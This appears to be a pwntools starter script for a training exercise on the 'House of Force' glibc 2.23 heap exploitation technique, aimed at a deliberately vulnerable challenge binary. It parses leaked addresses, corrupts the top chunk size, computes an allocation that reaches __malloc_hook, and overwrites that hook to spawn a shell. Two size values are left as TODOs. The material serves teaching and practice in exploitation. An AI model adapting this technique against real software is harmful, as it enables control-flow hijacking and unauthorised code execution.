'''
House of Force Starter

Fill out the TODO's:
- Corrupted top chunk size (step 1) 
- Chunk size for LARGE allocation (step 2) 
'''

from pwn import * 

mode = 'DEBUG' # Turn on gdb
libc_name='../../../libc_versions/2.23/libc-2.23.so'
env = {}

# Binary setup
elf_name = './.shining_moments-2.23'

elf = ELF(elf_name)
if libc_name != '': 
	libc = ELF(libc_name)
	env = {"LD_PRELOAD": libc.path}
	
# Process creation 
if mode == 'DEBUG': 
	p = gdb.debug([elf.path], env=env, gdbscript='''
dir ../../../libc_versions/2.23/ 
''') 

else: 
	p = remote(domain, port) 

def get_leaks(): 
	'''
	Leaks are just given to us :) 
	So interpret these for later!
	'''
	p.recvuntil(": ")
	heap_base = int(p.recvuntil("\n"), 16)

	p.recvuntil(": ") 
	libc_leak = int(p.recvuntil("\n"), 16) 
	libc_base = libc_leak - libc_offset

	p.recvuntil(": ") 
	stack_leak = int(p.recvuntil("\n"), 16) 
	# stack_base = stack_leak - stack_offset Kind of unpredictable...
	
	print("LibC Base: {}".format(hex(libc_base)))
	print("Heap Base: {}".format(hex(heap_base)))
	print("Stack Leak: {}".format(hex(stack_leak)))
	return heap_base, libc_base

def corrupt_topchunk():
	'''
	Set the top chunk size to a VERY large value. 
	The purpose of the 'House of Force' is to be able to 
	request a VERY large value that goes to anywhere we want in 
	memory :) 

	How does this work? Through the process of trying to find the 
	chunk after tcache, fastbins, unsorted bins, small and large bins
	it checks to see if the 'top_chunk' has enough space to simply
	extend it. 

	The code for this check can be found at 
	https://elixir.bootlin.com/glibc/glibc-2.23/source/malloc/malloc.c#L3796 
	The 'top_chunk' is blindly trusted for how much is in the top chunk. 
	By setting this to an insanely large value, it is possible to 
	allocate a chunk to ANY point in memory (yes, you can even wrap 
	around the space if you'd like :))
	'''	
	print("Overwriting the top chunk size")
	prev_size = "\x00" * 8 # Does not matter...
	size = "\x00" * 8 # TODO: Top Chunk corrupted size (step 1) 
	p.sendlineafter("?", prev_size + size)

def calc_size_hook(heap_base, libc_base): 
	'''
	Now that the top_chunk size is corrupted, we have to request
	a chunk that is 'X' bytes away from the current location of
	the top_chunk. So, we must calculate the relative offset 
	between the location of the 'top_chunk' and the place to write
	to. 

	Mathmatically, this looks like the following: 
	- size = place_to_write - top_chunk_address 

	There are several ways to do this: 
	- EIP on stack to return 
	- GOT entry 
	- Other function pointers (hooks and things) 
	- etc. 

	For the exercise below, we are going to set this to __malloc_hook!

	This is done with the following math: 
	- size = __malloc_hook - top_chunk_address - 0x20

	We request a size and this puts us directly at 
	__malloc_hook - 0x10 for the next allocation to be
	made via a chunk taken from the top_chunk. 
	'''	
	

	# Find the address of the __malloc_hook
	malloc_hook = libc_base + malloc_hook_offset	
	print("__malloc_hook address: {}".format(hex(malloc_hook)))
	
	# The top_chunk is at the heap_base currently
	top_chunk_loc = heap_base # The start of the top chunk is the same as the heap_base for this challenge
	
	'''
	Size calculation
	==================

	Use these variables to do the math to put the target chunk at the proper location.
	This have already been calculated for you!

	- libc_base: The base address of LibC
	- heap_base: The base address of the heap
	- top_chunk_loc: The address of the top chunk
	- malloc_hook: The location of the malloc hook
	'''
	# Get the relative location (from the heap) to the __malloc_hook
	size = 0x0 # TODO: Size of allocation (step 2 with breakpoint 2)

	'''
	first- 0x10: For the metadata tacked onto the request 
	second - 0x10: To account for the metadata prior to the __malloc_hook
	'''
	size = size - 0x10 - 0x10

	# Send the size 
	p.sendlineafter("?", str(size))
	print("Size of allocation: ", hex(size))
	return size 

def code_exec(libc_base): 
	'''
	At this point, the next chunk points to __malloc_hook. 
	This allows us to write to this location with a one_gadget or some
	function pointer to get code execution :)
	The next call to malloc will now pop a shell!
	'''

	print("Writing to the 'target' location")	
	pop_shell = elf.symbols['pop_shell'] 
	p.sendlineafter(";)", p64(pop_shell))	


## Offsets for 2.23
libc_offset = 0x3f520 
malloc_hook_offset = 0x3a03b0

heap_base, libc_base = get_leaks()

corrupt_topchunk() 
calc_size_hook(heap_base, libc_base) # This one and the next one both do the same thing and work well
code_exec(libc_base) 

p.interactive()

